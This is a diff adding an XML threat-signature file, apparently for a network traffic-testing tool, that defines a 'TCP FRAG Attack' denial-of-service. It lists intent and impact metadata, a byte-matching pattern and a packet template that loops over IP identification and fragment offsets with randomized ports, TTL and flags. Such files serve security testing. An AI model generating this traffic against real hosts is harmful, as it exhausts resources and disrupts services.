@@ -1,0 +1,78 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="TCP FRAG Attack"/>
+    <EngDesc display="true" value="This attack is based of the Imperfect Networks Incremental Frag attack."/>
+    <Intent display="true">
+      <item value="Denial_of_Service"/>
+      <item value="Resource_Exhaustion"/>
+      <item value="Fragmentation"/>
+    </Intent>
+    <Protocol display="true" value="TCP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Protocol"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Microsoft"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Network_Layer"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Transport_Layer_TCP"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value=""/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Phil Trainor"/>
+    <ID display="true" value="0000010598133c9d00c000a80001003c4786f022"/>
+    <Revision display="true" value="6"/>
+    <Safe display="true" value=""/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632742243395000000"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="H"/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X08\X00\X49\X5C\X02\X00\X02\X00\X61\X62\X63\X64\X65\X66\X67\X68\X69\X6A\X6B\X6C\X6D\X6E\X6F\X70\X71\X72\X73\X74\X75\X76\X77\X61\X62\X63\X64\X65\X66\X67\X68\X69"/>
+    <Created value="1139461850" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="F"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="G"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="J"/>
+  </Variables>
+  <Loops>
+    <for index="H">
+      <for index="B"/>
+      <for index="C"/>
+      <for index="F"/>
+      <for index="G"/>
+      <for index="J"/>
+      <for index="L" range="Identification"/>
+      <for index="Q" range="FragmentOffset"/>
+    </for>
+  </Loops>
+  <Output index="H" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="5" TypeofService="0" TotalLength="" Identification="@range(0,32)" FragmentOffset="@range(0,1F00)" TTL="@random(20,40)" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1025,65535)" destPort="$destPort" SeqNumber="@random(0,FFFF)" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="0800495C020002006162636465666768696A6B6C6D6E6F7071727374757677616263646566676869" CWR="false" ECE="false" URG="@random(true,false)" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+</threatSignature>
